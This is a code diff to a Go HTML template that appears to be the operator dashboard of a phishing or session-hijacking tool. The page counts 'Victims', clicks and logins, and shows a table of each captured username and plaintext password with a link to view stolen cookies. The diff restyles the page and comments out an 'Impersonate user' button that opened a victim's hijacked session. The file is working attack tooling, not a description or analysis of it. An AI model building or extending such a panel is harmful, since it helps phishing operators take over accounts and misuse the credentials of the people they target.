@@ -90,21 +90,25 @@ function clearcookies(){
 <body>
 
 <div class="container">
-  <h1>Victims</h1>
   <div class="row">
   	<div class="col-md-4 text-center">
-  		<h2>Clicks</h2>
-  		<p style="font-size: 2em;">{{len .Victims}}</p>
+  		<h4>Clicks</h4>
+  		<p style="font-weight:bold;font-size: 1em;">{{len .Victims}}</p>
   	</div>
   	<div class="col-md-4 text-center">
-  		<h2>Logins</h2>
-  		<p style="font-size: 2em;">{{.CredsCount}} ({{printf "%.1f" .CredsPercent}}%)</p>
+  		<h4>Logins</h4>
+  		<p style="font-weight:bold;font-size: 1em;">{{.CredsCount}} ({{printf "%.1f" .CredsPercent}}%)</p>
   	</div>
   	<div class="col-md-4 text-center">
-  		<h2>Terminations</h2>
-  		<p style="font-size: 2em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
+  		<h4>Terminations</h4>
+  		<p style="font-weight:bold;font-size: 1em;">{{.TermCount}} ({{printf "%.1f" .TermPercent}}%)</p>
   	</div>
   </div>
+  
+  <hr>
+
+  <div class="row">
+
   <table class="table table-dark">
     <thead class="thead-dark">
       <tr>
@@ -112,7 +116,6 @@ function clearcookies(){
         <th class="text-center">Username</th>
         <th class="text-center">Password</th>
         <th class="text-center">Terminated</th>
-        <th class="text-center">Session</th>
         <th class="text-center">Cookies</th>
 
       </tr>
@@ -120,9 +123,9 @@ function clearcookies(){
     <tbody>
     {{range .Victims}}
       <tr>
-        <td>{{.UUID}}</td>
-        <td>{{.Username}}</td>
-        <td>{{.Password}}</td>
+        <td class="text-center">{{.UUID}}</td>
+        <td class="text-center">{{.Username}}</td>
+        <td class="text-center">{{.Password}}</td>
         <td class="text-center">
         {{if .Terminated}}
         <span style="color: green; font-weight: bold;">Y</span>
@@ -130,14 +133,15 @@ function clearcookies(){
         <span style="color: red; font-weight: bold;">N</span>
         {{end}}
         </td>
-        <td><a onclick="clearcookies();" href="/{{$.URL}}/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a>
-        <td><a  href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
+        {{/* This requires additional coding ... <td><a onclick="clearcookies();" href="/{{$.URL}}/ImpersonateFrames?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-warning">Impersonate user (beta)</a> */}}
+        <td class="text-center"><a  href="/{{$.URL}}/Cookies?user_id={{.UUID}}" target="_blank" id="code" type="submit" class="btn btn-info">View Cookies</a>
 		</td>
 
       </tr>
     {{end}}
     </tbody>
   </table>
+</div>
 </div>
 
 </body>
